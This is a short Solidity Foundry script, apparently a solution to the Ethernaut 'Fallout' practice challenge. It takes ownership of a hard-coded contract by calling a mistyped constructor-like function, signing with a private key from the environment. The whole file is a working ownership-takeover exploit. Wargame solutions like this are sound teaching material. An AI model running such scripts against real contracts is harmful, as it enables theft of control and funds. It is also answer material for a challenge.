// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

// import "../src/02_Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IFallout {
    function owner() external view returns (address);
    function Fal1out() external payable;
}

contract FalloutAttack is Script {
    IFallout fallout = IFallout(0xd103f61E24Da4eC7BCCD5e069497FD0B80374208);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before: ", fallout.owner());
        fallout.Fal1out();
        console.log("Owner after: ", fallout.owner());
        vm.stopBroadcast();
    }
}
